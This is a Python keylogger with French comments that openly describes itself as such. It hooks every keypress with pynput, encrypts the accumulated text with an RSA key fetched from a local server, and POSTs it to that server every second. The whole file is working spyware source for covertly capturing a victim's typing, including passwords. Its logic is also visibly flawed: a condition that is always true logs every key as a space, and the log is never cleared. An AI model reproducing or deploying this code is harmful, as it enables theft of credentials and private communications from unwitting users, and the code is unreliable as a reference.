# Ce code est un keylogger. Il enregistre les frappes au clavier et les envoie au serveur toutes les secondes.
# La communication avec le serveur se fait via HTTP.

# Importation des bibliothèques nécessaires
import threading
import time
import base64
import pynput
import requests as requests
import rsa

# Initialisation de la variable qui stockera les entrées clavier
log = ''


# Fonction pour récupérer la clé publique du serveur
def get_public_key_from_server():
    try:
        # Envoi de la requête HTTP GET pour obtenir la clé publique
        response = requests.get('http://127.0.0.1:5000/rsa/public_key/')
        if response.status_code == 200:
            print('public_key retrieved:', response.text)
            # Conversion du texte reçu en binaire et retour
            return response.text.encode()
        else:
            # Si la requête a échoué, affichage d'un message d'erreur
            print('Failed to retrieve public key from server')
    except requests.exceptions.RequestException as e:
        # En cas d'erreur lors de la requête, affichage d'un message d'erreur
        print('An error occurred while retrieving the public key: ', e)


# Fonction pour envoyer les données cryptées au serveur
def send_message_to_server(ciphered_message):
    try:
        # Envoi de la requête HTTP POST pour envoyer les données cryptées
        requests.post('http://127.0.0.1:5000/rsa/logs/', data={'message': ciphered_message})
    except requests.exceptions.RequestException as e:
        # En cas d'erreur lors de la requête, affichage d'un message d'erreur
        print('An error occurred while sending the message: ', e)


# Chargement de la clé publique du serveur
public_key = rsa.PublicKey.load_pkcs1(get_public_key_from_server())


# Cette fonction est appelée lorsqu'une touche du clavier est appuyée. Elle met à jour la variable globale "log" en
# ajoutant le caractère associé à la touche appuyée.
def process_keys(key):
    global log

    arrows = [pynput.keyboard.Key.up, pynput.keyboard.Key.down, pynput.keyboard.Key.left, pynput.keyboard.Key.right]
    try:
        # Fix pour Mac M1 car la touche pour espace n'est pas détéctée avec Key.space.
        if key == pynput.keyboard.Key.space or pynput.keyboard.KeyCode.from_char(' '):
            log += ' '
        elif key == pynput.keyboard.Key.enter:
            log += '\n'
        elif key == pynput.keyboard.Key.backspace:
            log = log[:-1]
        elif key.char in arrows:
            log += ''
        elif key == pynput.keyboard.KeyCode.from_char(' '):
            log += ' '
        else:
            log += key.char
    except AttributeError:
        pass


# Cette fonction chiffre le texte en entrée avec la clé publique RSA téléchargée du serveur.
def encrypt(plaintext):
    return base64.b64encode(rsa.encrypt(plaintext.encode(), public_key))


# Cette fonction est appelée toutes les secondes pour envoyer au serveur les données capturées sur le clavier.
def report():
    global log
    if log != '':
        encrypted_log = encrypt(log)
        send_message_to_server(encrypted_log)


# Cette fonction lance une boucle qui appelle la fonction report() toutes les secondes.
def run_report():
    if not public_key:
        print('Error: Could not find public key. Aborting')
        return
    while True:
        report()
        time.sleep(1)


if __name__ == '__main__':
    keyboard_listener = pynput.keyboard.Listener(on_press=process_keys)

    thread = threading.Thread(target=run_report)
    thread.start()

    with keyboard_listener:
        keyboard_listener.join()
